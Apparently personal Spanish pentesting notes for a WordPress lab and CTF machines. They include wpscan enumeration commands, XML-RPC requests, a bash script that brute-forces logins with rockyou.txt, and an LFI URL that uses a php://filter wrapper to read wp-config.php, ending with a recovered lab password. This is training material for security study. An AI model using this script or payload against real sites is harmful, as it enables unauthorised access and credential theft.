# CONFIGURACIÓN ENTORNO VULNERABLE
Vamos a montar con Docker un entorno wordpress vulnerable utilizando este repositorio:
![[Pasted image 20230421125333.png]]
Desplegamos todo (a excepción del último comando porque sinó dará error), y vemos que tenemos el phpmyadmin corriendo por el puerto 31338:
![[Pasted image 20230421125715.png]]
![[Pasted image 20230421125735.png]]
Y por el puerto 31337 tenemos el wordpress:
![[Pasted image 20230421125810.png]]
Por ejemplo pondré esta configuración en el panel de instalación:
![[Pasted image 20230421125908.png]]
Y ya lo tenemos configurado en una versión algo antigua con ciertas vulnerabilidades:
![[Pasted image 20230421130013.png]]
Y así es como se ve el wordpress por defecto:
![[Pasted image 20230421130122.png]]
Y en el repositorio también vemos las vulnerabilidades existentes en esta versión de wordpress:
![[Pasted image 20230421130440.png]]
Y ahora para terminar de configurar todo, instalamos los plugins necesarios con el último comando:
![[Pasted image 20230421130211.png]]
# ENUMERACIÓN WORDPRESS
El primer paso es que dentro del panel de login de wordpress, podemos ver como podemos comprobar si el usuario existe o no en el sistema:
![[Pasted image 20230421130642.png]]
![[Pasted image 20230421130657.png]]
Aquí ya podríamos hacer un ataque de fuerza bruta con hydra, pero también podemos seguir enumerando el wordpress con una herramienta que se llama wpscan:
![[Pasted image 20230421131301.png]]
Y ya nos detecta automáticamente información del wordpress y si está desactualizado:
![[Pasted image 20230421131405.png]]
### ENUMERAR USUARIOS EXISTENTES WORDPRESS
Si queremos únicamente enumerar usuarios válidos en wordpress con wpscan, lo haríamos de la siguiente forma:
```bash
wpscan --url http://10.10.123.20/wordpress/ -e u
```
![[Pasted image 20230825163135.png]]
Y con los parámetros vp, u podemos enumerar plugins vulnerables y usuarios existentes:
![[Pasted image 20230421131525.png]]
Y nos encuentra el usuario mario e incluso otro más llamado Editor:
![[Pasted image 20230421131556.png]]
## ENUMERAR VULNERABILIDADES PLUGINS WORDPRESS
Es posible que en wordpress exista vulnerabilidades incluso si se encuentra actualizado en su última versión debido a los plugins. Por tanto, de forma introductoria, podemos listar los plugins instalados en el sistema haciendo un petición con curl y filtrando en donde ponga plugins:
![[Pasted image 20230421132645.png]]
Aunque también con la herramienta wpscan podemos hacer un análisis de vulnerabilidades de los plugins de wordpress, pero necesitamos la API de esta herramienta:
![[Pasted image 20230421132036.png]]
Una vez con esta API, la podemos poner en el parámetro oportuno de la herramienta y ahora ya sí va a mostrarnos los plugins vulnerables:
![[Pasted image 20230421132147.png]]
Y nos las encuentra:
![[Pasted image 20230421132205.png]]
E incluso si filtramos ya tenemos un RCE sin estar autenticado:
![[Pasted image 20230421132300.png]]
Ahora ya con esta información podemos buscarlo en searchsploit:
![[Pasted image 20230421132949.png]]
# ENUMERAR XMLRPC + ATAQUES FUERZA BRUTA WORDPRESS
También es posible que podamos enumerar este archivo el cual nos sirve para obtener credenciales de usuarios, ya que se trata de un archivo que permite la comunicación de wordpress y otros sistemas usando php; y si lo buscamos en el navegador vemos que existe pero que sólo tramita peticiones por POST:
![[Pasted image 20230421133400.png]]
Por tanto con curl vamos a enviarle una petición por POST y vemos que sí nos devuelve algo en XML:
![[Pasted image 20230421133532.png]]
Y ahora que vemos que existe este fichero, buscamos en google como explotar vulnerabilidades haciendo uso de este fichero:
![[Pasted image 20230421133725.png]]
Y nos dicen que tenemos que tramitar esto:
![[Pasted image 20230421133752.png]]
```php
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```
Por tanto pegamos este código en un fichero xml:
![[Pasted image 20230421133907.png]]
Y ahora este fichero lo tramitamos por POST contra el xmlrpc de wordpress:
![[Pasted image 20230421134022.png]]
Y el servidor nos responde con todos los métodos disponibles:
![[Pasted image 20230421134102.png]]
Y si miramos más en la página, vemos que nos muestran como hacer un ataque de fuerza bruta:
![[Pasted image 20230421134340.png]]
```php
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```
Y vemos que aquí si ponemos unas credenciales correctas y lo ejecutamos como antes, nos va a funcionar correctamente:
![[Pasted image 20230421134520.png]]
![[Pasted image 20230421134540.png]]
En este punto podríamos hacer un ataque de fuerza bruta, tanto con un script de bash o con la propia herramienta wpscan:
```bash
#!/bin/bash

#!/bin/bash

function salir() {
    exit 1
}

trap salir SIGINT

for i in $(cat rockyou.txt); do
    variable=$(cat <<FIN
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>Elliot</value></param> 
<param><value>$i</value></param> 
</params>     
</methodCall>
FIN
    )

    echo -e "$variable" >> enviar.xml
    echo -e "[+] Probamos con la contraseña $i"

    curl -s -X POST 'http://10.10.126.89/xmlrpc.php' -d@enviar.xml >> log.log

    if [ ! "$(cat log.log | grep 'Incorrect username or password.')" ]; then
         echo -e "[+] La contraseña para Elliot es $i"
         exit 0
    fi

    sleep 1

rm log.log enviar.xml

done
```
![[Pasted image 20230421143424.png]]
O también directamente desde la herramienta, lo cual será más rápido:
![[Pasted image 20230421143525.png]]
Y nos la encuentra:
![[Pasted image 20230421143548.png]]
# OBTENCIÓN WP-CONFIG.PHP
Dentro de los wordpress hay un fichero de configuración donde se guardan credenciales de los usuarios registrados; y podemos llegar a él explotando distintas vulnerabilidades, como un LFI detectando primero un plugin vulnerable con wpscan en la máquina [[MAQUINA ALL IN ONE]]
```bash
wpscan --url http://10.10.123.20/wordpress/ -e p
```
Y encontramos este que es vulnerable:
![[Pasted image 20230825163230.png]]
Tenemos un scrip

```bash
https://wpscan.com/vulnerability/8609
```
![[Pasted image 20230825164108.png]]
Lo probamos en el navegador y funciona:
![[Pasted image 20230825164125.png]]
Pero si queremos obtener el fichero wp-config.php, tenemos que hacer uso de un wrapper:
```bash
http://10.10.6.206/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```
![[Pasted image 20230826170029.png]]
Esto lo tenemos que decodificar ya que viene en base64:
![[Pasted image 20230826170206.png]]
Y vemos las credenciales del usuario elyana:
```bash
elyana:H@ckme@123
```